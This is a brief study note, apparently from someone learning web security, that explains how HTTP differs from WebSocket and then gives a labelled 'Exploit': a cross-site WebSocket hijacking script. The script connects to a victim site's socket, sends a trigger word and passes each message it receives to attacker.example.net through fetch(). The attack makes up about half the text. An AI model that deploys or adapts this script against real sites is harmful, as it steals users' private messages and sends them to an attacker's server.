Differente between HTTP and Websocket

  "HTTP protocol: HTTP is unidirectional where the client sends the request and the server sends the response. 
  WebSocket: WebSocket is bidirectional, a full-duplex protocol that is used in the same scenario of client-server communication, unlike HTTP it starts from ws:// or wss://. It is a stateful protocol, which means the connection between client and server will keep alive until it is terminated by either party (client or server). After closing the connection by either of the client and server, the connection is terminated from both ends."

Websocket is used when you need real-time updates, like videogames, or chat app (whatsapp), for example.

Exploit:

<script>
  ws = new WebSocket('wss://vulnerable.example.com/messages');
  ws.onopen = function start(event) {
    ws.send("HELLO"); << here is the word that will make the server send you all the messages >>
  }
  ws.onmessage = function handleReply(event) {
    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});
  }
  ws.send("Some text sent to the server");
</script>
